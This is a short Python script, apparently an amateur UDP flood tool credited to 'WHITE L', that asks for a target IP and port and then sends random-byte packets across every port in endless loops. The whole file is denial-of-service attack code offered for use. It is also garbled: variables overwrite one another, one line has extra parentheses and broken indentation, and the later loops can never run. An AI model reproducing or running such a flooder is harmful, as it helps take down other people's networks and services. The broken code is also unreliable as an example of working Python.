#Author WHITE L'
import socket
import os
import random
import time
import sys

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(45000)
bytes = random._urandom(55000)
bytes = random._urandom(35532)
random = random._urandom(25500)

os.system("clear")
ip = input("[+] Target's IP : ")
port = input("[+] Target's Port : ")
bytes = input("[+] Kecepatan Packet : ")
random = input("[+] Random Tools 1-200000 : ")
ping = input("[+] Ping Target 1-200000 : ")
os.system("clear")
print("Attack starting...")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
while True:
    sent = 0
    for bytes in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
while True:
    sent = 0
    for bytes in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
while True:
    sent = 0
    for random in range(1, 65534):
        white.sendto(random, (ip, port))
        sent = sent + 1
        port = port + 1
while True:
    sent = 0
    for random in range(1, 65534):
        white.sendto(random, (ip, port))
        sent = sent + 1
        port = port + 1
while True:
    sent = 0
    for random in range(1, 65534):
        white.sendto(random, (ip, port))
        sent = sent + 1
        port = port + 1
while True:
    sent = 0
    for ping in range(1, 65534):
       white.sendto(random, (ip, port))))
        sent = sent + 1
        port = port + 1
while True:
    sent = 0
    for ping in range(1, 65534):
        white.sendto(random, (ip, port))
        sent = sent + 1
        port = port + 1
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
